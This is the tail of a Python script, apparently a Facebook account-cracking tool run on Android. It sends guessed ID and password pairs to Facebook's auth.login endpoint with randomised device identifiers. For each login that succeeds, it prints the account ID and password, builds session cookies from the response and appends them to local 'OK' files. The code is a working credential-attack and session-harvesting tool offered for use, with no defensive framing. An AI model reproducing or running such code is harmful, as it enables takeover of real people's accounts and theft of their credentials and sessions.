            data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids, 'password': ps, 'generate_analytics_claims': '1','community_id': '', 'cpl': 'true', 'try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false', 'generate_session_cookies': '1','generate_machine_id': '1', 'currently_logged_in_userid': '0','locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate'}
            q = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).json()
            if 'session_key' in q:
                if "yes" in scoki:
                    udx = str(q['uid'])
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    cok = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cokis =f"sb={cok};{coki}"
                    print('\r\033[1;92m [PRINCE-OK] '+udx+' | '+ps+'\n\033[0;97m')
                    print('\r\033[1;93m [COOKIE-ID] \033[1;92m '+cokis+'\n\033[1;97m')
                    open('/sdcard/PRINCE-IDS/NUMBER-COKI-OK.txt','a').write(udx+'|'+ps+'|'+cokis+'\n')
                    oks.append(ids)
                else:
                    udx = str(q['uid'])
                    print('\r\033[1;92m [PRINCE-OK] '+udx+' | '+ps+'\033[0;97m')
                    open('/sdcard/PRINCE-IDS/NUMBER-OK.txt','a').write(udx+'|'+ps+'\n')
                    oks.append(ids)
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(5)

main()